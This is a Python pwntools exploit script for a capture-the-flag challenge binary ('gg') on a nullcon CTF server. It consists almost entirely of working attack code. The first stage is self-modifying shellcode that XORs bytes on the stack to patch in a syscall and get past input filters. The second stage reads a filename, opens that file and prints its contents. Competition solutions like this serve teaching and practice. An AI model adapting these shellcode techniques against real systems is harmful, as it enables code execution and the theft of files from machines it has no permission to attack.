#!/usr/bin/python
from pwn import *
import sys

config = {
	"elf" : "./gg",
	"libc" : "",
	"HOST" : "pwn.ctf.nullcon.net",
	"PORT" : 4011
}

def exploit(r):

	context.arch = "amd64"
	shellc = asm("""
	add_rdx:
		push rdx
		push rdx
		push rdx
		push rdx
		push rdx
		push rdx
		push rdx
		push rdx
		push rsp
		pop rcx

		xor eax, 0x41414141
		xor eax, 0x41415141
		xor dword ptr[rcx + 0x38], eax

		pop rcx
		pop rcx
		pop rcx
		pop rcx
		pop rcx
		pop rcx
		pop rcx
		pop rcx

	make_syscall:
		xor eax, 0x41414141
		xor eax, 0x41415141
		xor eax, 0x30363030
		xor eax, 0x35396e6f
		xor dword ptr [rcx + 0x30], eax

	add_rcx:
		push rcx
		push rcx
		push rcx
		push rcx
		push rcx
		push rcx
		push rcx
		push rcx
		push rsp
		pop rcx

		xor eax, 0x30363030
		xor eax, 0x35396e6f
		xor eax, 0x41414141
		xor eax, 0x41414171
		xor dword ptr[rcx + 0x38], eax

		pop rcx
		pop rcx
		pop rcx
		pop rcx
		pop rcx
		pop rcx
		pop rcx
		pop rcx

	setup_reg:
		push rbx
		pop rax

		push r11
		pop rdx

		push rcx
		push rbx
		push rcx
	""")

	# nop2 = asm("push rax; pop rax")
	# while len(shellc) < 0x1030:
	# 	shellc += nop2

	# shellc += "o"
	# shellc += "n"
	# shellc += "95"

	print len(shellc)
	r.send(shellc)

	#######################
	# STAGE 2             #
	# read flag shellcode #
	#######################
	shellc = asm("""
	read:
		sub rsp, 0x1000
		mov rsi, rsp
		xor rdi, rdi
		mov rdx, 0x100
		xor rax, rax
		syscall

		mov rdi, rsp
		xor rsi, rsi
		xor rdx, rdx
		mov rax, 2
		syscall

		mov rdi, rax
		mov rsi, rsp
		mov rdx, 0x100
		xor rax, rax
		syscall

		mov rdi, 1
		mov rsi, rsp
		mov rdx, 0x100
		mov rax, 1
		syscall
	
		mov rax, 60
		syscall
	""")
	r.interactive()
	r.send("A"*4+shellc)
	r.interactive()
	r.send("flag\x00")

	r.interactive()
	return

if __name__ == "__main__":
	
	if "elf" in config.keys() and config["elf"]:
		e = ELF(config["elf"])
	
	if "libc" in config.keys() and config["libc"]:
		libc = ELF(config["libc"])

	if sys.argv[-1] == "remote":
		r = remote(config["HOST"], config["PORT"])
		exploit(r)
	else:
		if "libc" in dir():
			r = process(config["elf"], env={"LD_PRELOAD" : config["libc"]})
		else:
			r = process(config["elf"])
		print util.proc.pidof(r)

		if sys.argv[-1] == "debug":
			pause()
		exploit(r)
